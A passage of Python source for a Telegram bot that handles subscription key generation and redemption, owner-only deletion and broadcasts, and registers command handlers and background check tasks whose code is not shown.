            f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n" +
            '\n'.join([f"➔ {key}\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration} days" for key in keys]) +
            "\n\n𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n𝐓𝐲𝐩𝐞 /redeem {key}"
        )
    except Exception as e:
        logger.error(f"Error in genkey command: {e}")
        await update.message.reply_text("An error occurred while generating keys. Please try again.")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        try:
            key = context.args[0]
        except:
            await update.message.reply_text("Usage: /redeem <key>")
            return
        result = await redeem_key(user_id, key)
        if result:
            tier, duration_days = result
            await update.message.reply_text(
                f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 🎉\n\n𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐧𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration_days} days\n\n𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"
            )
        else:
            await update.message.reply_text("Invalid or already redeemed key.")
    except Exception as e:
        logger.error(f"Error in redeem command: {e}")
        await update.message.reply_text("An error occurred while redeeming the key. Please try again.")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.id != OWNER_ID:
            await update.message.reply_text("You are not authorized to use this command.")
            return
        try:
            user_id = int(context.args[0])
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /delkey <user_id>\nExample: /delkey 123456789")
            return
        user = await get_user(user_id)
        if not user or 'tier' not in user:
            await update.message.reply_text(f"No active subscription found for user ID {user_id}.")
            return
        await delete_user_subscription(user_id)
        await update.message.reply_text(f"Subscription for user ID {user_id} has been deleted successfully ✅")
    except Exception as e:
        logger.error(f"Error in delkey command: {e}")
        await update.message.reply_text("An error occurred while deleting the subscription. Please try again.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.id != OWNER_ID:
            await update.message.reply_text("You are not authorized to use this command.")
            return
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text("Usage: /broadcast <message>")
            return
        users = await users_collection.find().to_list(length=None)
        success_count = 0
        for user in users:
            try:
                await context.bot.send_message(chat_id=user['user_id'], text=message)
                success_count += 1
            except:
                pass
        await update.message.reply_text(f"Broadcast sent to {success_count} users.")
    except Exception as e:
        logger.error(f"Error in broadcast command: {e}")
        await update.message.reply_text("An error occurred while sending the broadcast. Please try again.")

async def main():
    try:
        application = Application.builder().token(TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(CommandHandler("chk", chk))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(CallbackQueryHandler(button_callback))
        single_task = asyncio.create_task(process_single_checks())
        bulk_task = asyncio.create_task(process_user_checks())
        try:
            await application.initialize()
            await application.start()
            await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
            await asyncio.Event().wait()
        except (KeyboardInterrupt, SystemExit):
            logger.info("Shutting down application")
        finally:
            await application.stop()
            await application.updater.stop()
            single_task.cancel()
            bulk_task.cancel()
            await asyncio.gather(single_task, bulk_task, return_exceptions=True)
    except Exception as e:
        logger.error(f"Error in main: {e}")
        raise

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    if loop.is_running():
        logger.warning("Using running event loop")
        loop.create_task(main())
    else:
        loop.run_until_complete(main())